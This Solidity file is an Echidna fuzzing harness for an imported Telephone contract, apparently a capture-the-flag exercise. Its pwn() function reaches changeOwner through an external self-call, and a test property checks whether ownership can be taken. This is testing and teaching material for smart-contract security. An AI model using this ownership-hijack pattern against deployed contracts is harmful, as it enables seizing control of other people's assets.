pragma solidity ^0.8.10;
import "./Telephone.sol";

//$: ~/echidna-test ./src/4_Telephone/EchidnaTelephone.sol --contract EchidnaTelephone --config ./src/4_Telephone/echidna_config.yaml
contract EchidnaTelephone is Telephone {

  function pwn() external {
    this.changeOwner(address(0));
  }

  function echidna_test_owner() public returns (bool) {
    return owner==msg.sender;
  }
}